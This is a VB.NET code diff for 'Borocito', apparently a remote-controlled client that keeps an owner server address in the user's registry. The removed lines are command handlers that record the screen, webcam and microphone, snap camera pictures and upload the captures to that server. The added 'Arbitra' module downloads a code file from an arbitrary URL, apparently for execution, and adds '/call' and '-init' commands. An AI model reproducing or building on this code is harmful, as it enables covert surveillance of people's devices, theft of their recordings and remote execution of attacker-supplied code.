@@ -56,23 +56,27 @@ Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
     Public OwnerServer As String
     Public UID As String
-    Sub SaveRegedit()
-        Try
-            AddToLog("SaveRegedit@Memory", "Saving data...", False)
-            regKey.SetValue("UID", UID, RegistryValueKind.String)
-            LoadRegedit()
-        Catch ex As Exception
-            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
-        End Try
-    End Sub
     Sub LoadRegedit()
         Try
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
             OwnerServer = regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
             HttpOwnerServer = "http://" & OwnerServer
+            RegisterInstance()
         Catch ex As Exception
             AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+
+    Sub RegisterInstance()
+        Try
+            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
+            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
+            If registerKey IsNot Nothing Then
+                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
+            End If
+        Catch ex As Exception
+            AddToLog("RegisterInstance@Memory", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
@@ -99,64 +103,55 @@ Module StartUp
             AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
-
     Sub ReadParameters(ByVal parametros As String)
         Try
             If parametros <> Nothing Then
                 Dim parameter As String = parametros
                 Dim args() As String = parameter.Split(" ")
 
-                If parameter.ToLower Like "*/startscreenrecording*" Then
-                    'Comienza a grabar la pantalla
-                    Main.StartScreenRecord()
-                ElseIf parameter.ToLower Like "*/stopscreenrecording*" Then
-                    'Detiene la grabacion de pantalla
-                    Main.StopScreenRecord()
-                ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
-                    'Detiene y luego envia la grabacion de pantalla
-                    Main.UploadFileToServer(Main.SaveScreenRecord())
+                If parameter.ToLower.StartsWith("-init") Then
+                    If args.Count = 3 Then 'no arg
+                        BoroHearInterop(Main.Initializer(args(1)))
+                    Else
+                        BoroHearInterop(Main.Initializer(args(1), args(2)))
+                    End If
+
+                ElseIf parameter.ToLower.StartsWith("/call") Then
+                    If args.Count = 2 Then 'no param
+                        BoroHearInterop(Main.ArbitraCall())
+                    Else
+                        BoroHearInterop(Main.ArbitraCall(args(1)))
+                    End If
+
+                ElseIf parameter.ToLower.StartsWith("-kill") Then
                     End
-
-                ElseIf parameter.ToLower Like "*/startcamrecording*" Then
-                    'Comienza a grabar la camara
-                    BoroHearInterop(Main.StartCamRecord())
-                ElseIf parameter.ToLower Like "*/stopcamrecording*" Then
-                    'Detiene la grabacion de la camara
-                    Main.StopCamRecord()
-                ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
-                    'Detiene y luego envia la grabacion de la camara
-                    Main.UploadFileToServer(Main.StopCamRecord())
-                    End
-
-                ElseIf parameter.ToLower Like "*/camera*" Then
-                    BoroHearInterop(Main.CameraManager(args(1)))
-                ElseIf parameter.ToLower Like "*/getcameras*" Then
-                    BoroHearInterop(Main.GetCameras())
-
-                ElseIf parameter.ToLower Like "*/takecampicture*" Then
-                    'Toma una captura de la camara y la envia
-                    Main.UploadFileToServer(Main.TakeCamPicture)
-
-                ElseIf parameter.ToLower Like "*/startmicrecording*" Then
-                    'Comenzar a grabar microfono
-                    Main.StartMicRecord()
-                ElseIf parameter.ToLower Like "*/stopmicrecord*" Then
-                    'Detiene la grabacion del microfono
-                    Main.StopMicRecord()
-                    Main.StopMicRecord(True)
-                ElseIf parameter.ToLower Like "*/sendmicrecord*" Then
-                    'Envia la grabacion del microfono
-                    Main.UploadFileToServer(Main.SaveMicRecord)
-                    End
-
-                ElseIf parameter.ToLower Like "*/stop*" Then
-                    'Detiene todo y se cierra
-                    End
-
                 End If
+            Else
             End If
         Catch ex As Exception
-            AddToLog("ReadParameters@Main", "Error: " & ex.Message, True)
+            AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+End Module
+Module Arbitra
+    Public fileCodeProvider As String
+    Public isInitialized As Boolean = False
+
+    Sub GetCodePathFile(ByVal thingPATH As String)
+        Try
+            'verificar que tipo de string se ha ingresado
+            '   archivo > leer
+            '   link > descargar > leer
+            If thingPATH.ToLowerInvariant.StartsWith("http") Then
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\CodeProvider.vb") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\CodeProvider.vb")
+                End If
+                My.Computer.Network.DownloadFile(thingPATH, DIRCommons & "\CodeProvider.vb")
+            Else
+                fileCodeProvider = thingPATH
+            End If
+        Catch ex As Exception
+            AddToLog("GetCodePathFile@Arbitra", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
